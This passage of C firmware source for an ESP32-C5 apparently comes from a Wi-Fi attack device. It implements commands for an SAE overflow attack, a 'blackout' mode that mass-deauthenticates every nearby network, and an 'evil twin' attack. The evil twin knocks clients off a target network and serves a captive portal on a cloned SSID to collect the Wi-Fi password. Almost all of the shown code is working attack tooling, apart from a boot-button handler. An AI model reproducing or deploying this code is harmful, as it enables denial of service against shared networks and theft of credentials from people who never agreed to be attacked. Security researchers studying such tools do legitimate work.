Smethan/projectZero/ESP32C5/main/main.c
        // Allocate memory for ap_record to pass to task
        wifi_ap_record_t *ap_copy = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t));
        if (ap_copy == NULL) {
            MY_LOG_INFO(TAG, "Failed to allocate memory for SAE attack!");
            applicationState = IDLE;
            return 1;
        }
        memcpy(ap_copy, ap, sizeof(wifi_ap_record_t));
        
        // Start SAE attack in background task
        sae_attack_active = true;
        BaseType_t result = xTaskCreate(
            sae_attack_task,
            "sae_task",
            8192,  // Larger stack size for crypto operations
            ap_copy,
            5,     // Priority
            &sae_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create SAE overflow task!");
            free(ap_copy);
            sae_attack_active = false;
            applicationState = IDLE;
            return 1;
        }
        
    } else {
        MY_LOG_INFO(TAG,"SAE Overflow: you need to select exactly ONE network (use select_networks).");
    }
    return 0;
}

// Blackout attack command - scans all networks every 3 minutes, sorts by channel, attacks all
static int cmd_start_blackout(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    oled_display_update_full("> Blackout Mode", "  All networks", "  Mass deauth", "  Active...");
    log_memory_info("start_blackout");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check if blackout attack is already running
    if (blackout_attack_active || blackout_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Blackout attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    MY_LOG_INFO(TAG, "Starting blackout attack - scanning all networks every 3 minutes...");
    MY_LOG_INFO(TAG, "Networks will be sorted by channel for efficient attacking.");
    MY_LOG_INFO(TAG, "Use 'stop' to stop the attack.");
    
    // Start blackout attack in background task
    blackout_attack_active = true;
    BaseType_t result = xTaskCreate(
        blackout_attack_task,
        "blackout_task",
        4096,  // Stack size
        NULL,
        5,     // Priority
        &blackout_attack_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create blackout attack task!");
        blackout_attack_active = false;
        return 1;
    }
    
    return 0;
}

static void boot_button_task(void *arg) {
    const TickType_t delay_ticks = pdMS_TO_TICKS(BOOT_BUTTON_POLL_DELAY_MS);
    const TickType_t long_press_ticks = pdMS_TO_TICKS(BOOT_BUTTON_LONG_PRESS_MS);
    bool prev_pressed = (gpio_get_level(BOOT_BUTTON_GPIO) == 0);
    TickType_t press_start_tick = prev_pressed ? xTaskGetTickCount() : 0;
    bool long_action_triggered = false;

    while (1) {
        bool pressed = (gpio_get_level(BOOT_BUTTON_GPIO) == 0);
        TickType_t now = xTaskGetTickCount();

        if (pressed) {
            if (!prev_pressed) {
                // Rising edge - start tracking the press
                press_start_tick = now;
                long_action_triggered = false;
            } else if (!long_action_triggered && (now - press_start_tick) >= long_press_ticks) {
                long_action_triggered = true;
                printf("Boot Long Pressed\n");
                fflush(stdout);
                boot_handle_action(true);
            }
        } else if (prev_pressed) {
            // Falling edge - button released
            if (!long_action_triggered) {
                printf("Boot Pressed\n");
                fflush(stdout);
                boot_handle_action(false);
            }
            long_action_triggered = false;
        }

        prev_pressed = pressed;
        vTaskDelay(delay_ticks);
    }
}

/*
0) Starts captive portal to collect password
1) Starts a stream of deauth packets sent to all target networks. 
2) When password is entered in portal, stops deauth stream and attempts to connect to a network

*/
static int cmd_start_evil_twin(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    // Reset onlyDeauth — evil twin always needs full portal + deauth
    onlyDeauth = 0;
    if (!onlyDeauth) {
        char oled_target[48];
        oled_build_target_summary(oled_target, sizeof(oled_target));
        oled_display_update_full("> Evil Twin", oled_target, "  Captive portal", "  Waiting pwd..");
    }
    log_memory_info("start_evil_twin");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check if attack is already running
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;

    if (g_selected_count > 0) {
        // Set application state based on attack type
        if (onlyDeauth) {
            applicationState = DEAUTH;
        } else {
            applicationState = DEAUTH_EVIL_TWIN;
            // Reset state for new attack
            last_password_wrong = false;
            portal_connected_clients = 0;
        }

        const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
        evilTwinSSID = malloc(strlen(sourceSSID) + 1); 
        if (evilTwinSSID != NULL) {
            strcpy(evilTwinSSID, sourceSSID);
        } else {
            ESP_LOGW(TAG,"Malloc error 4 SSID");
        }

        // Start portal before starting deauth attack
        if (!onlyDeauth) {
            MY_LOG_INFO(TAG,"Starting captive portal for Evil Twin attack on: %s", evilTwinSSID);
            
            // Enable AP mode (switches to APSTA) and get AP netif
            esp_netif_t *ap_netif = ensure_ap_mode();
            if (!ap_netif) {
                MY_LOG_INFO(TAG, "Failed to enable AP mode");
                applicationState = IDLE;
                return 1;
            }
            
            // Stop DHCP server to configure custom IP
            esp_netif_dhcps_stop(ap_netif);
            
            // Set static IP 172.0.0.1 for AP
            esp_netif_ip_info_t ip_info;
            ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
            ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
            ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
            
            esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
            if (ret != ESP_OK) {
                applicationState = IDLE;
                return 1;
            }
            
